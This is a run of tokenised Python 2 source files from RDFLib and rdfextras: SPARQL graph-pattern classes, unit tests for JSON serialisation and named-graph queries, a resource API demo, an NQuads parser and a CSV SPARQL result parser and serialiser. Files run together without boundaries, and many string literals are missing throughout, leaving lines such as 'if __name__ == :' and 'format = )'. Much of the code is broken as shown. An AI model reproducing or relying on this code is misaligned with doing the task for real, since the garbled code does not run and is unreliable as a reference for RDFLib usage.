~~~ """\n    Create an RDFLib Literal instance with the corresponding XML\n    Schema datatype set. If the variable is already an RDFLib\n    resource, it simply returns the resource; otherwise the\n    corresponding Literal.  A SPARQLError Exception is raised if the\n    type is not implemented.\n\n    The Literal contains the string representation of the variable (as\n    Python does it by default) with the corresponding XML Schema URI\n    set.\n\n    :param v: Python variable\n\n    :return: either an RDFLib Literal (if \'v\' is not an RDFLib Resource),\n        or the same variable if it is already an RDFLib resource (i.e.,\n        Literal, BNode, or URIRef)\n\n    :raise SPARQLError: if the type of \'v\' is not implemented\n    """ \n 
\n 
if isinstance ( v , Literal ) or isinstance ( v , BNode ) or isinstance ( v , URIRef ) : \n 
# just do nothing \n 
~~~ return v \n 
\n 
~~ else : \n 
~~~ return Literal ( v ) # Literal now does the datatype bits \n 
\n 
\n 
~~ ~~ def _isResQuest ( r ) : \n 
~~~ """\n    Is \'r\' a request string (ie, of the form "?XXX")?\n\n    :rtype:   Boolean\n    """ \n 
\n 
if r and isinstance ( r , basestring ) and r [ 0 ] == _questChar : \n 
~~~ return True \n 
\n 
~~ return False \n 
\n 
\n 
~~ class GraphPattern : \n 
~~~ """\n    Storage of one Graph Pattern, ie, the pattern tuples and the\n    possible (functional) constraints (filters)\n    """ \n 
\n 
def __init__ ( self , patterns = [ ] ) : \n 
~~~ """\n        :param patterns: an initial list of graph pattern tuples\n        """ \n 
\n 
self . patterns = [ ] \n 
self . constraints = [ ] \n 
self . unbounds = [ ] \n 
self . bnodes = { } \n 
\n 
if type ( patterns ) == list : \n 
~~~ self . addPatterns ( patterns ) \n 
\n 
~~ elif type ( patterns ) == tuple : \n 
~~~ self . addPattern ( patterns ) \n 
\n 
~~ else : \n 
~~~ raise SPARQLError ( \n 
"illegal argument, pattern must be a tuple or a list of tuples" ) \n 
\n 
~~ ~~ def _generatePattern ( self , tupl ) : \n 
~~~ """\n        Append a tuple to the local patterns. Possible type literals\n        are converted to real literals on the fly.  Each tuple should\n        be contain either 3 elements (for an RDF Triplet pattern) or\n        four, where the fourth element is a per-pattern constraint\n        (filter). (The general constraint of SPARQL can be optimized\n        by assigning a constraint to a specific pattern; because it\n        stops the graph expansion, its usage might be much more\n        optimal than the the \'global\' constraint).\n\n        :param tupl: either a three- or four-element tuple\n\n        """ \n 
\n 
if type ( tupl ) != tuple : \n 
~~~ raise SPARQLError ( \n 
"illegal argument, pattern must be a tuple, got %s" % type ( tupl ) ) \n 
\n 
~~ if len ( tupl ) != 3 and len ( tupl ) != 4 : \n 
~~~ raise SPARQLError ( \n 
"illegal argument, pattern must be a tuple of 3 or 4 element, got %s" % len ( tupl ) ) \n 
\n 
~~ if len ( tupl ) == 3 : \n 
~~~ ( s , p , o ) = tupl \n 
f = None \n 
~~ else : \n 
~~~ ( s , p , o , f ) = tupl \n 
\n 
~~ final = [ ] \n 
for c in ( s , p , o ) : \n 
\n 
~~~ if _isResQuest ( c ) : \n 
~~~ if not c in self . unbounds : \n 
~~~ self . unbounds . append ( c ) \n 
~~ final . append ( c ) \n 
\n 
~~ elif isinstance ( c , BNode ) : \n 
# Do nothing - BNode name management is handled by SPARQL parser \n 
# if not c in self.bnodes: \n 
#     self.bnodes[c] = BNode() \n 
~~~ final . append ( c ) \n 
\n 
~~ else : \n 
~~~ final . append ( _createResource ( c ) ) \n 
\n 
~~ ~~ final . append ( f ) \n 
\n 
return tuple ( final ) \n 
\n 
~~ def addPattern ( self , tupl ) : \n 
~~~ """\n        Append a tuple to the local patterns. Possible type literals\n        are converted to real literals on the fly.  Each tuple should\n        be contain either 3 elements (for an RDF Triplet pattern) or\n        four, where the fourth element is a per-pattern constraint\n        (filter). (The general constraint of SPARQL can be optimized\n        by assigning a constraint to a specific pattern; because it\n        stops the graph expansion, its usage might be much more\n        optimal than the the \'global\' constraint).\n\n        :param tupl: either a three- or four-element tuple\n\n        """ \n 
\n 
self . patterns . append ( self . _generatePattern ( tupl ) ) \n 
\n 
~~ def insertPattern ( self , tupl ) : \n 
~~~ """\n        Insert a tuple to to the start of local patterns. Possible\n        type literals are converted to real literals on the fly.  Each\n        tuple should be contain either 3 elements (for an RDF Triplet\n        pattern) or four, where the fourth element is a per-pattern\n        constraint (filter). (The general constraint of SPARQL can be\n        optimized by assigning a constraint to a specific pattern;\n        because it stops the graph expansion, its usage might be much\n        more optimal than the the \'global\' constraint).\n\n        Semantically, the behaviour induced by a graphPattern does not\n        depend on the order of the patterns. However, due to the\n        behaviour of the expansion algorithm, users may control the\n        speed somewhat by adding patterns that would \'cut\' the\n        expansion tree soon (ie, patterns that reduce the available\n        triplets significantly). API users may be able to do that,\n        hence this additional method.\n\n        :param tupl: either a three- or four-element tuple\n\n        """ \n 
\n 
self . patterns . insert ( 0 , self . _generatePattern ( tupl ) ) \n 
\n 
\n 
~~ def addPatterns ( self , lst ) : \n 
~~~ """\n        Append a list of tuples to the local patterns. Possible type\n        literals are converted to real literals on the fly.  Each\n        tuple should be contain either three elements (for an RDF\n        Triplet pattern) or four, where the fourth element is a\n        per-pattern constraint. (The general constraint of SPARQL can\n        be optimized by assigning a constraint to a specific pattern;\n        because it stops the graph expansion, its usage might be much\n        more optimal than the the \'global\' constraint).\n\n        :param lst: list consisting of either a three- or four-element tuples\n\n        """ \n 
\n 
for l in lst : \n 
~~~ self . addPattern ( l ) \n 
\n 
~~ ~~ def insertPatterns ( self , lst ) : \n 
~~~ """\n        Insert a list of tuples to the start of the local\n        patterns. Possible type literals are converted to real\n        literals on the fly.  Each tuple should be contain either\n        three elements (for an RDF Triplet pattern) or four, where the\n        fourth element is a per-pattern constraint. (The general\n        constraint of SPARQL can be optimized by assigning a\n        constraint to a specific pattern; because it stops the graph\n        expansion, its usage might be much more optimal than the the\n        \'global\' constraint).\n\n        Semantically, the behaviour induced by a graphPattern does not\n        depend on the order of the patterns. However, due to the\n        behaviour of the expansion algorithm, users may control the\n        speed somewhat by adding patterns that would \'cut\' the\n        expansion tree soon (ie, patterns that reduce the available\n        triplets significantly). API users may be able to do that,\n        hence this additional method.\n\n        :param lst: list consisting of either a three- or four-element tuples\n\n        """ \n 
\n 
for i in xrange ( len ( lst ) - 1 , - 1 , - 1 ) : \n 
~~~ self . insertPattern ( lst [ i ] ) \n 
\n 
~~ ~~ def addConstraint ( self , func ) : \n 
~~~ """\n        Add a global filter constraint to the graph pattern. \'func\'\n        must be a method with a single input parameter (a dictionary)\n        returning a boolean. This method is I{added} to previously\n        added methods, ie, I{all} methods must return True to accept a\n        binding.\n\n        :param func: filter function\n\n        """ \n 
\n 
if type ( func ) == FunctionType : \n 
~~~ self . constraints . append ( func ) \n 
~~ else : \n 
~~~ raise SPARQLError ( \n 
"illegal argument, constraint must be a function type, got %s" % type ( func ) ) \n 
\n 
~~ ~~ def addConstraints ( self , lst ) : \n 
~~~ """\n        Add a list of global filter constraints to the graph\n        pattern. Each function in the list must be a method with a\n        single input parameter (a dictionary) returning a\n        boolean. These methods are I{added} to previously added\n        methods, ie, I{all} methods must return True to accept a\n        binding.\n\n        :param lst: list of functions\n\n        """ \n 
\n 
for l in lst : \n 
~~~ self . addConstraint ( l ) \n 
\n 
~~ ~~ def construct ( self , tripleStore , bindings ) : \n 
~~~ """\n        Add triples to a tripleStore based on a variable bindings of\n        the patterns stored locally.  The triples are patterned by the\n        current Graph Pattern. The method is used to construct a graph\n        after a successful querying.\n\n        :param tripleStore: an (rdflib) Triple Store\n        :param bindings: dictionary\n\n        """ \n 
localBnodes = { } \n 
\n 
for c in self . bnodes : \n 
~~~ localBnodes [ c ] = BNode ( ) \n 
\n 
~~ def bind ( st ) : \n 
~~~ if _isResQuest ( st ) : \n 
\n 
~~~ if st in bindings : \n 
~~~ return bindings [ st ] \n 
\n 
~~ else : \n 
\n 
~~~ if isinstance ( self , GraphPattern ) : \n 
~~~ return st \n 
~~ else : \n 
~~~ return None \n 
\n 
~~ ~~ ~~ elif isinstance ( st , BNode ) : \n 
\n 
~~~ for c in self . bnodes : \n 
\n 
~~~ if self . bnodes [ c ] == st : \n 
# this is a BNode that was created as part of building \n 
# up the pattern \n 
~~~ return localBnodes [ c ] \n 
\n 
# if we got here, the BNode comes from somewhere else... \n 
~~ ~~ return st \n 
\n 
~~ else : \n 
~~~ return st \n 
\n 
~~ ~~ for pattern in self . patterns : \n 
~~~ ( s , p , o , f ) = pattern \n 
triplet = [ ] \n 
valid = True \n 
\n 
for res in ( s , p , o ) : \n 
~~~ val = bind ( res ) \n 
\n 
if val != None : \n 
~~~ triplet . append ( val ) \n 
~~ else : \n 
~~~ valid = False \n 
break \n 
\n 
~~ ~~ if valid : \n 
~~~ tripleStore . add ( tuple ( triplet ) ) \n 
\n 
~~ ~~ ~~ def __add__ ( self , other ) : \n 
~~~ """Adding means concatenating all the patterns and filters arrays""" \n 
\n 
retval = GraphPattern ( ) \n 
retval += self \n 
retval += other \n 
return retval \n 
\n 
~~ def __iadd__ ( self , other ) : \n 
~~~ """Adding means concatenating all the patterns and filters arrays""" \n 
\n 
self . patterns += other . patterns \n 
self . constraints += other . constraints \n 
\n 
for c in other . unbounds : \n 
~~~ if not c in self . unbounds : \n 
~~~ self . unbounds . append ( c ) \n 
\n 
~~ ~~ for c in other . bnodes : \n 
~~~ if not c in self . bnodes : \n 
~~~ self . bnodes [ c ] = other . bnodes [ c ] \n 
\n 
~~ ~~ return self \n 
\n 
~~ def __str__ ( self ) : \n 
~~~ return self . __repr__ ( ) \n 
\n 
~~ def isEmpty ( self ) : \n 
~~~ """Is the pattern empty?\n\n        :return:   Boolean\n        """ \n 
return len ( self . patterns ) == 0 \n 
\n 
\n 
~~ ~~ class BasicGraphPattern ( GraphPattern ) : \n 
~~~ """\n    One justified, problem with the current definition of\n    :class:`~rdfextras.sparql.graph.GraphPattern` is that it makes it\n    difficult for users to use a literal of the type ``?XXX``, because\n    any string beginning with ``?`` will be considered to be an unbound\n    variable. The only way of doing this is that the user explicitly\n    creates a :class:`rdflib.term.Literal` object and uses that as part\n    of the pattern.\n\n    This class is a superclass of :class:`~rdfextras.sparql.graph.GraphPattern`\n    which does *not* do this, but requires the usage of a separate variable\n    class instance\n    """ \n 
\n 
def __init__ ( self , patterns = [ ] , prolog = None ) : \n 
~~~ """\n        :param patterns: an initial list of graph pattern tuples\n        """ \n 
\n 
GraphPattern . __init__ ( self , patterns ) \n 
self . prolog = prolog \n 
\n 
~~ def canonicalTerm ( self , term ) : \n 
\n 
~~~ if isinstance ( term , URIRef ) : \n 
\n 
~~~ if self . prolog is not None : \n 
~~~ namespace_manager = NamespaceManager ( Graph ( ) ) \n 
\n 
for prefix , uri in self . prolog . prefixBindings . items ( ) : \n 
~~~ namespace_manager . bind ( prefix , uri , override = False ) \n 
\n 
~~ try : \n 
~~~ prefix , uri , localName = namespace_manager . compute_qname ( term ) \n 
~~ except : \n 
~~~ return term \n 
\n 
~~ if prefix not in self . prolog . prefixBindings : \n 
~~~ return term \n 
~~ else : \n 
~~~ return . join ( [ prefix , localName ] ) \n 
\n 
~~ ~~ else : \n 
~~~ return term \n 
\n 
~~ ~~ elif isinstance ( term , Literal ) : \n 
~~~ return term . n3 ( ) \n 
\n 
~~ elif isinstance ( term , BNode ) : \n 
~~~ return term . n3 ( ) \n 
\n 
~~ else : \n 
~~~ assert isinstance ( term , Variable ) \n 
return term . n3 ( ) \n 
\n 
~~ ~~ def __repr__ ( self ) : \n 
# from pprint import pformat \n 
~~~ if self . constraints : \n 
# return "Filter(.. a filter ..,BGP(%s))"%(\',\'.join([pformat(p[:3]) for p in self.patterns])) ~~~ return "Filter(.. a filter ..,BGP(%s))" % ( \n 
. join ( [ . join ( [ \n 
self . canonicalTerm ( pat [ 0 ] ) , \n 
self . canonicalTerm ( pat [ 1 ] ) , \n 
self . canonicalTerm ( pat [ 2 ] ) ] \n 
) \n 
for pat in self . patterns ] ) ) \n 
\n 
~~ else : \n 
# return "BGP(%s)"%(\',\'.join([repr(p[:3]) for p in self.patterns])) \n 
~~~ return "BGP(%s)" % ( \n 
. join ( [ + . join ( [ \n 
self . canonicalTerm ( s ) , \n 
self . canonicalTerm ( p ) , \n 
self . canonicalTerm ( o ) ] \n 
) + \n 
for s , p , o , f in self . patterns ] ) ) \n 
~~ retval = "   Patterns:    %s\\n" % self . patterns \n 
retval += "   Constraints: %s\\n" % self . constraints \n 
retval += "   Unbounds:    %s\\n" % self . unbounds \n 
\n 
return retval \n 
\n 
~~ def _generatePattern ( self , tupl ) : \n 
~~~ """\n        Append a tuple to the local patterns. Possible type literals\n        are converted to real literals on the fly.  Each tuple should\n        be contain either 3 elements (for an RDF Triplet pattern) or\n        four, where the fourth element is a per-pattern constraint\n        (filter). (The general constraint of SPARQL can be optimized\n        by assigning a constraint to a specific pattern; because it\n        stops the graph expansion, its usage might be much more\n        optimal than the the \'global\' constraint).\n\n        :param tupl: either a three- or four-element tuple\n\n        """ \n 
if type ( tupl ) != tuple : \n 
~~~ raise SPARQLError ( \n 
"illegal argument, pattern must be a tuple, got %s" % type ( tupl ) ) \n 
\n 
~~ if len ( tupl ) != 3 and len ( tupl ) != 4 : \n 
~~~ raise SPARQLError ( \n 
"illegal argument, pattern must be a tuple of 3 or 4 element, got %s" % len ( tupl ) ) \n 
\n 
~~ if len ( tupl ) == 3 : \n 
~~~ ( s , p , o ) = tupl \n 
f = None \n 
~~ else : \n 
~~~ ( s , p , o , f ) = tupl \n 
\n 
~~ final = [ ] \n 
for c in ( s , p , o ) : \n 
\n 
~~~ if isinstance ( c , Variable ) : \n 
\n 
~~~ if not c in self . unbounds : \n 
~~~ self . unbounds . append ( c ) \n 
\n 
~~ final . append ( c ) \n 
\n 
~~ elif isinstance ( c , BNode ) : \n 
# Do nothing - BNode name management is handled by SPARQL parser \n 
~~~ final . append ( c ) \n 
\n 
~~ else : \n 
~~~ final . append ( _createResource ( c ) ) \n 
\n 
~~ ~~ final . append ( f ) \n 
\n 
return tuple ( final ) \n 
\n 
~~ def fetchTerminalExpression ( self ) : \n 
~~~ yield self \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ from rdfextras . sparql . evaluate import Unbound \n 
v1 = Variable ( "a" ) \n 
u1 = Unbound ( "a" ) \n 
g = BasicGraphPattern ( \n 
[ ( "a" , "?b" , 24 ) , ( "?r" , "?c" , 12345 ) , ( v1 , "?c" , 3333 ) , ( u1 , "?c" , 9999 ) ] ) \n 
print g \n 
\n 
~~ from rdflib import ConjunctiveGraph , plugin \n 
from rdflib . store import Store \n 
from StringIO import StringIO \n 
import unittest \n 
\n 
"""Tests for JSON Serialization of SPARQL Results""" \n 
\n 
\n 
test_data = """ \n@prefix foaf:       <http://xmlns.com/foaf/0.1/> .\n@prefix rdf:        <http://www.w3.org/1999/02/22-rdf-syntax-ns#> .\n\n<http://example.org/alice>  foaf:name       "Alice" .\n<http://example.org/alice>  foaf:knows      <http://example.org/bob> .\n<http://example.org/bob>  foaf:name       "Bob" .\n""" \n 
\n 
test_query = """\nPREFIX foaf: <http://xmlns.com/foaf/0.1/>\n\nSELECT ?name ?x ?friend\nWHERE { ?x foaf:name ?name .\n        OPTIONAL { ?x foaf:knows ?friend . }\n}\n""" \n 
\n 
correct = """"name" : {"type": "literal", "xml:lang" : "None", "value" : "Bob"},\n                   "x" : {"type": "uri", "value" : "http://example.org/bob"}\n                }""" \n 
\n 
test_header_query = """\nPREFIX foaf: <http://xmlns.com/foaf/0.1/>\n\nSELECT ?name ?friend\nWHERE { ?x foaf:name ?name .\n        OPTIONAL { ?x foaf:knows ?friend . }\n}\n""" \n 
\n 
# See Also: http://rdflib.net/pipermail/dev/2006-November/000112.html \n 
\n 
\n 
class JSON ( unittest . TestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ self . graph = ConjunctiveGraph ( plugin . get ( , Store ) ( ) ) \n 
self . graph . parse ( StringIO ( test_data ) , format = "n3" ) \n 
\n 
~~ def testComma ( self ) : \n 
~~~ """\n        Verify the serialisation of the data as json contains an exact\n        substring, with the comma in the correct place.\n        """ \n 
results = self . graph . query ( test_query ) \n 
result_json = results . serialize ( format = ) \n 
self . failUnless ( result_json . find ( correct ) > 0 ) \n 
\n 
~~ def testHeader ( self ) : \n 
~~~ """\n        Verify that the "x", substring is omitted from the serialised output.\n        """ \n 
results = self . graph . query ( test_header_query ) \n 
result_json = results . serialize ( format = ) \n 
self . failUnless ( result_json . find ( \'"x",\' ) == - 1 ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
~~ import unittest \n 
from rdflib import plugin \n 
from rdflib . namespace import Namespace , RDF , RDFS \n 
from rdflib . term import URIRef \n 
from rdflib . store import Store \n 
from cStringIO import StringIO \n 
from rdflib import Graph \n 
\n 
import rdflib \n 
\n 
\n 
try : \n 
~~~ set \n 
~~ except NameError : \n 
~~~ from sets import Set as set \n 
\n 
\n 
~~ testGraph1N3 = """\n@prefix rdf:  <http://www.w3.org/1999/02/22-rdf-syntax-ns#> .\n@prefix rdfs: <http://www.w3.org/2000/01/rdf-schema#> .\n@prefix : <http://test/> .\n:foo :relatedTo [ a rdfs:Class ];\n     :parentOf ( [ a rdfs:Class ] ).\n:bar :relatedTo [ a rdfs:Resource ];\n     :parentOf ( [ a rdfs:Resource ] ).\n     \n( [ a rdfs:Resource ] ) :childOf :bar.     \n( [ a rdfs:Class ] )    :childOf :foo.\n""" \n 
\n 
sparqlQ1 = """\nBASE <http://test/>\nPREFIX rdf:  <http://www.w3.org/1999/02/22-rdf-syntax-ns#> \nPREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n\nSELECT ?node WHERE { ?node :relatedTo [ a rdfs:Class ] }""" \n 
\n 
\n 
sparqlQ2 = """\nBASE <http://test/>\nPREFIX rdf:  <http://www.w3.org/1999/02/22-rdf-syntax-ns#> \nPREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n\nSELECT ?node WHERE { ?node :parentOf ( [ a rdfs:Class ] ) }""" \n 
\n 
\n 
sparqlQ3 = """\nBASE <http://test/>\nPREFIX rdf:  <http://www.w3.org/1999/02/22-rdf-syntax-ns#> \nPREFIX rdfs: <http://www.w3.org/2000/01/rdf-schema#>\n\nSELECT ?node WHERE { ( [ a rdfs:Resource ] ) :childOf ?node }""" \n 
\n 
sparqlQ4 = """\nPREFIX owl:  <http://www.w3.org/2002/07/owl#> \n\nSELECT DISTINCT ?class \nFROM <http://www.w3.org/2002/07/owl#>\nWHERE { ?thing a ?class }""" \n 
\n 
class AdvancedTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ memStore = plugin . get ( , Store ) ( ) \n 
self . testGraph = Graph ( memStore ) \n 
self . testGraph . parse ( StringIO ( testGraph1N3 ) , format = ) \n 
\n 
~~ def testNamedGraph ( self ) : \n 
# I am not sure this is the behaviour we DO want.  \n 
# see https://github.com/RDFLib/rdfextras/issues/27 \n 
~~~ OWL_NS = Namespace ( "http://www.w3.org/2002/07/owl#" ) \n 
rt = self . testGraph . query ( sparqlQ4 ) \n 
self . assertEquals ( set ( rt ) , set ( ( x , ) for x in [ OWL_NS . DatatypeProperty , OWL_NS . ObjectProperty , \n 
~~ def testScopedBNodes ( self ) : \n 
~~~ rt = self . testGraph . query ( sparqlQ1 ) \n 
self . assertEquals ( list ( rt ) [ 0 ] [ 0 ] , URIRef ( "http://test/foo" ) ) \n 
\n 
~~ def testCollectionContentWithinAndWithout ( self ) : \n 
~~~ rt = self . testGraph . query ( sparqlQ3 ) \n 
self . assertEquals ( list ( rt ) [ 0 ] [ 0 ] , URIRef ( "http://test/bar" ) ) \n 
\n 
~~ def testCollectionAsObject ( self ) : \n 
~~~ rt = self . testGraph . query ( sparqlQ2 ) \n 
self . assertEquals ( list ( rt ) [ 0 ] [ 0 ] , URIRef ( "http://test/foo" ) ) \n 
self . assertEquals ( 1 , len ( rt ) ) \n 
\n 
~~ ~~ if __name__ == : \n 
~~~ suite = unittest . makeSuite ( AdvancedTests ) \n 
unittest . TextTestRunner ( verbosity = 3 ) . run ( suite ) \n 
~~ from urllib2 import URLError \n 
try : \n 
~~~ from Ft . Lib import UriException \n 
~~ except : \n 
~~~ from urllib2 import URLError as UriException \n 
~~ import unittest \n 
from rdflib import ConjunctiveGraph , URIRef \n 
\n 
class SPARQLloadContextsTest ( unittest . TestCase ) : \n 
\n 
~~~ def test_dSet_parsed_as_URL_raises_Exception ( self ) : \n 
~~~ querystr = """SELECT DISTINCT ?s FROM <http://test/> { ?s ?p ?o }""" \n 
graph = ConjunctiveGraph ( ) \n 
graph . get_context ( URIRef ( "http://test/" ) \n 
) . parse ( "http://www.w3.org/People/Berners-Lee/card.rdf" ) \n 
self . assertRaises ( ( URLError , UriException ) , \n 
graph . query , ( querystr ) , loadContexts = False ) \n 
\n 
~~ def test_dSet_parsed_as_context_returns_results ( self ) : \n 
~~~ querystr = """SELECT DISTINCT ?s FROM <http://test/> { ?s ?p ?o }""" \n 
graph = ConjunctiveGraph ( ) \n 
graph . get_context ( URIRef ( ) \n 
) . parse ( "http://www.w3.org/People/Berners-Lee/card.rdf" ) \n 
r = graph . query ( querystr , loadContexts = True ) \n 
self . assert_ ( len ( r . bindings ) is not 0 ) \n 
\n 
~~ ~~ """\n\nRDFLib has a :class:`~rdflib.resource.Resource` class, for a resource-centric API.\n\nA resource acts like a URIRef with an associated graph, and allows\nquickly adding or querying for triples where this resource is the\nsubject.\n\n\n""" \n 
\n 
from rdflib import Graph , RDF , RDFS , Literal \n 
from rdflib . namespace import FOAF \n 
\n 
if __name__ == : \n 
\n 
~~~ g = Graph ( ) \n 
\n 
bob = g . resource ( ) \n 
\n 
bob . set ( RDF . type , FOAF . Person ) # .set replaces all other values \n 
bob . set ( FOAF . name , Literal ( "Bob" ) ) \n 
\n 
\n 
bill = g . resource ( ) \n 
\n 
bill . add ( RDF . type , FOAF . Person ) # add adds to existing values \n 
bill . add ( RDF . type , FOAF . Agent ) \n 
bill . set ( RDFS . label , Literal ( "Bill" ) ) \n 
\n 
bill . add ( FOAF . knows , bob ) \n 
\n 
\n 
\n 
print "Bill\'s friend: " , bill . value ( FOAF . knows ) . value ( FOAF . name ) \n 
\n 
# slicing ([] syntax) can also be used:  \n 
\n 
print "Bill knows: " , \n 
for friend in bill [ FOAF . knows ] : \n 
~~~ print friend [ FOAF . name ] . next ( ) , " " \n 
\n 
# or even quicker with paths: \n 
~~ print "Bill knows: " , \n 
for friend in bill [ FOAF . knows / FOAF . name ] : \n 
~~~ print friend \n 
\n 
# setting single properties is also possible: \n 
~~ bill [ RDFS . label ] = Literal ( "William" ) \n 
\n 
print g . serialize ( format = ) \n 
~~ """\nThis is a rdflib plugin for parsing NQuad files into Conjunctive\ngraphs that can be used and queried. The store that backs the graph\n*must* be able to handle contexts.\n\n>>> from rdflib import ConjunctiveGraph, URIRef, Namespace\n>>> g = ConjunctiveGraph()\n>>> data = open("test/nquads.rdflib/example.nquads", "rb")\n>>> g.parse(data, format="nquads") # doctest:+ELLIPSIS\n<Graph identifier=... (<class \'rdflib.graph.Graph\'>)>\n>>> assert len(g.store) == 449\n>>> # There should be 16 separate contexts\n>>> assert len([x for x in g.store.contexts()]) == 16\n>>> # is the name of entity E10009 "Arco Publications"?\n>>> #   (in graph http://bibliographica.org/entity/E10009)\n>>> # Looking for:\n>>> # <http://bibliographica.org/entity/E10009>\n>>> #   <http://xmlns.com/foaf/0.1/name>\n>>> #   "Arco Publications"\n>>> #   <http://bibliographica.org/entity/E10009>\n>>> s = URIRef("http://bibliographica.org/entity/E10009")\n>>> FOAF = Namespace("http://xmlns.com/foaf/0.1/")\n>>> assert(g.value(s, FOAF.name).eq("Arco Publications"))\n""" \n 
\n 
from codecs import getreader \n 
\n 
from rdflib . py3compat import b \n 
\n 
from rdflib import ConjunctiveGraph \n 
\n 
# Build up from the NTriples parser: \n 
from rdflib . plugins . parsers . ntriples import NTriplesParser \n 
from rdflib . plugins . parsers . ntriples import ParseError \n 
from rdflib . plugins . parsers . ntriples import r_tail \n 
from rdflib . plugins . parsers . ntriples import r_wspace \n 
from rdflib . plugins . parsers . ntriples import r_wspaces \n 
\n 
__all__ = [ ] \n 
\n 
\n 
class NQuadsParser ( NTriplesParser ) : \n 
\n 
~~~ def parse ( self , inputsource , sink , ** kwargs ) : \n 
~~~ """Parse f as an N-Triples file.""" \n 
assert sink . store . context_aware , ( "NQuadsParser must be given" \n 
" a context aware store." ) \n 
self . sink = ConjunctiveGraph ( store = sink . store , identifier = sink . identifier ) \n 
\n 
source = inputsource . getByteStream ( ) \n 
\n 
if not hasattr ( source , ) : \n 
~~~ raise ParseError ( "Item to parse must be a file-like object." ) \n 
\n 
~~ source = getreader ( ) ( source ) \n 
\n 
self . file = source \n 
self . buffer = \n 
while True : \n 
~~~ self . line = __line = self . readline ( ) \n 
if self . line is None : \n 
~~~ break \n 
~~ try : \n 
~~~ self . parseline ( ) \n 
~~ except ParseError , msg : \n 
~~~ raise ParseError ( "Invalid line (%s):\\n%r" % ( msg , __line ) ) \n 
\n 
~~ ~~ return self . sink \n 
\n 
~~ def parseline ( self ) : \n 
~~~ self . eat ( r_wspace ) \n 
if ( not self . line ) or self . line . startswith ( ( ) ) : \n 
~~~ return # The line is empty or a comment \n 
\n 
~~ subject = self . subject ( ) \n 
self . eat ( r_wspace ) \n 
\n 
predicate = self . predicate ( ) \n 
self . eat ( r_wspace ) \n 
\n 
obj = self . object ( ) \n 
self . eat ( r_wspace ) \n 
\n 
context = self . uriref ( ) or self . nodeid ( ) or self . sink . identifier \n 
self . eat ( r_tail ) \n 
\n 
if self . line : \n 
~~~ raise ParseError ( "Trailing garbage" ) \n 
# Must have a context aware store - add on a normal Graph \n 
# discards anything where the ctx != graph.identifier \n 
~~ self . sink . get_context ( context ) . add ( ( subject , predicate , obj ) ) \n 
~~ ~~ """\n\nThis module implements a parser and serializer for the CSV SPARQL result\nformats\n\nhttp://www.w3.org/TR/sparql11-results-csv-tsv/\n\n""" \n 
\n 
import codecs \n 
import csv \n 
\n 
from rdflib import Variable , BNode , URIRef , Literal , py3compat \n 
\n 
from rdflib . query import Result , ResultSerializer , ResultParser \n 
\n 
\n 
class CSVResultParser ( ResultParser ) : \n 
~~~ def __init__ ( self ) : \n 
~~~ self . delim = "," \n 
\n 
~~ def parse ( self , source ) : \n 
\n 
~~~ r = Result ( ) \n 
\n 
if isinstance ( source . read ( 0 ) , py3compat . bytestype ) : \n 
# if reading from source returns bytes do utf-8 decoding \n 
~~~ source = codecs . getreader ( ) ( source ) \n 
\n 
~~ reader = csv . reader ( source , delimiter = self . delim ) \n 
r . vars = [ Variable ( x ) for x in reader . next ( ) ] \n 
r . bindings = [ ] \n 
\n 
for row in reader : \n 
~~~ r . bindings . append ( self . parseRow ( row , r . vars ) ) \n 
\n 
~~ return r \n 
\n 
~~ def parseRow ( self , row , v ) : \n 
~~~ return dict ( ( var , val ) \n 
for var , val in zip ( v , [ self . convertTerm ( t ) \n 
for t in row ] ) if val is not None ) \n 
\n 
~~ def convertTerm ( self , t ) : \n 
~~~ if t == "" : \n 
~~~ return None \n 
~~ if t . startswith ( "_:" ) : \n 
~~~ return BNode ( t ) # or generate new IDs? \n 
~~ if t . startswith ( "http://" ) or t . startswith ( "https://" ) : # TODO: more? \n 
~~~ return URIRef ( t ) \n 
~~ return Literal ( t ) \n 
\n 
\n 
~~ ~~ class CSVResultSerializer ( ResultSerializer ) : \n 
\n 
~~~ def __init__ ( self , result ) : \n 
~~~ ResultSerializer . __init__ ( self , result ) \n 
\n 
self . delim = "," \n 
if result . type != "SELECT" : \n 
~~~ raise Exception ( \n 
"CSVSerializer can only serialize select query results" ) \n 
\n 
~~ ~~ def serialize ( self , stream , encoding = ) : \n 
\n 
~~~ if py3compat . PY3 : \n 
# the serialiser writes bytes in the given encoding \n 
# in py3 csv.writer is unicode aware and writes STRINGS, \n 
# so we encode afterwards \n 
# in py2 it breaks when passed unicode strings, \n 
# and must be passed utf8, so we encode before \n 
\n 
~~~ import codecs \n 
stream = codecs . getwriter ( encoding ) ( stream ) \n 
\n 
~~ out = csv . writer ( stream , delimiter = self . delim ) \n 
\n 
vs = [ self . serializeTerm ( v , encoding ) for v in self . result . vars ] \n 
out . writerow ( vs ) \n 
for row in self . result . bindings : \n 
~~~ out . writerow ( [ self . serializeTerm ( \n 
row . get ( v ) , encoding ) for v in self . result . vars ] ) \n 
\n 
~~ ~~ def serializeTerm ( self , term , encoding ) : \n 
~~~ if term is None : \n 
~~~ return "" \n 
~~ if not py3compat . PY3 : \n 
~~~ return term . encode ( encoding ) \n 
~~ else : \n 
~~~ return term \n 
#!/usr/bin/env python \n 
# -*- coding: utf-8 -*- \n 
~~ ~~ ~~ """\nTesting with Nose\n=================\n\nThis test runner uses Nose for test discovery and running. It uses the argument\nspec of Nose, but with some options pre-set. To begin with, make sure you have\nNose installed, e.g.:\n\n    $ sudo easy_install nose\n\nFor daily test runs, use:\n\n    $ ./run_tests.py\n\nIf you supply attributes, the default ones defined in ``DEFAULT_ATTRS`` will be\nignored. So to run e.g. all tests marked ``slowtest`` or ``non_standard_dep``,\ndo:\n\n    $ ./run_tests.py -a slowtest,non_standard_dep\n\nSee <http://code.google.com/p/python-nose/> for furher details. An excellent\narticle is also available at <http://ivory.idyll.org/articles/nose-intro.html>.\n\nNote that this is just a convenience script. You can use ``nosetests`` directly\nif it\'s on $PATH, with the difference that you have to supply the options\npre-set here manually.\n\nCoverage\n========\n\nIf ``coverage.py`` is placed in $PYTHONPATH, it can be used to create coverage\ninformation (using the built-in coverage plugin of Nose) if the default\noption "--with-coverage" is supplied (which also enables some additional\ncoverage options).\n\nSee <http://nedbatchelder.com/code/modules/coverage.html> for details.\n\n""" \n 
